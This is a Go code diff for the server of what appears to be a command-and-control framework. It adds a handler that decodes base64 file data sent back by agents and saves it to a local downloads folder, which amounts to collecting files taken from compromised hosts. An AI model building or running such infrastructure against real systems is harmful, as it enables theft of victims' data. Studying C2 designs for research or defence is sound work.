@@ -2,12 +2,15 @@ package server
 
 import (
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
 	"log"
 	"math/rand"
 	"net/http"
+	"os"
+	"path/filepath"
 	"time"
 
 	"github.com/go-chi/chi/v5"
@@ -17,6 +20,9 @@ import (
 	"c2framework/internals/crypto"
 	"c2framework/internals/models"
 )
+
+// DownloadDirectory is where downloaded files are saved
+const DownloadDirectory = "./downloads"
 
 // HTTPSServer implements the Server interface for HTTPS
 type HTTPSServer struct {
@@ -166,7 +172,19 @@ func ResultHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Unmarshal the CommandResult to get the actual message string
+	// Try to detect if this is a download result
+	if len(result.CommandResult) > 0 {
+		var downloadResult models.DownloadResult
+		if err := json.Unmarshal(result.CommandResult, &downloadResult); err == nil {
+			// Check if it has file_data - that confirms it's a download result
+			if downloadResult.FileData != "" {
+				handleDownloadResult(result.JobID, &downloadResult)
+				return
+			}
+		}
+	}
+
+	// Not a download result - handle as generic result
 	var messageStr string
 	if len(result.CommandResult) > 0 {
 		if err := json.Unmarshal(result.CommandResult, &messageStr); err != nil {
@@ -180,4 +198,40 @@ func ResultHandler(w http.ResponseWriter, r *http.Request) {
 	} else {
 		log.Printf("Job (ID: %s) has succeeded\nMessage: %s", result.JobID, messageStr)
 	}
+}
+
+// handleDownloadResult processes and saves a download result
+func handleDownloadResult(jobID string, downloadResult *models.DownloadResult) {
+	if !downloadResult.Success {
+		log.Printf("Job (ID: %s) DOWNLOAD FAILED: %s", jobID, downloadResult.ErrorMsg)
+		return
+	}
+
+	// Decode the base64 file data
+	fileData, err := base64.StdEncoding.DecodeString(downloadResult.FileData)
+	if err != nil {
+		log.Printf("Job (ID: %s) ERROR: Failed to decode base64 file data: %v", jobID, err)
+		return
+	}
+
+	// Create downloads directory if it doesn't exist
+	if err := os.MkdirAll(DownloadDirectory, 0755); err != nil {
+		log.Printf("Job (ID: %s) ERROR: Failed to create downloads directory: %v", jobID, err)
+		return
+	}
+
+	// Extract just the filename from the path (handles both Windows and Unix paths)
+	filename := filepath.Base(downloadResult.FilePath)
+	// Prefix with job ID to avoid collisions
+	savedFilename := fmt.Sprintf("%s_%s", jobID, filename)
+	savedPath := filepath.Join(DownloadDirectory, savedFilename)
+
+	// Write the file
+	if err := os.WriteFile(savedPath, fileData, 0644); err != nil {
+		log.Printf("Job (ID: %s) ERROR: Failed to save file: %v", jobID, err)
+		return
+	}
+
+	log.Printf("Job (ID: %s) DOWNLOAD SUCCESS: Saved %d bytes to %s (original: %s)",
+		jobID, len(fileData), savedPath, downloadResult.FilePath)
 }
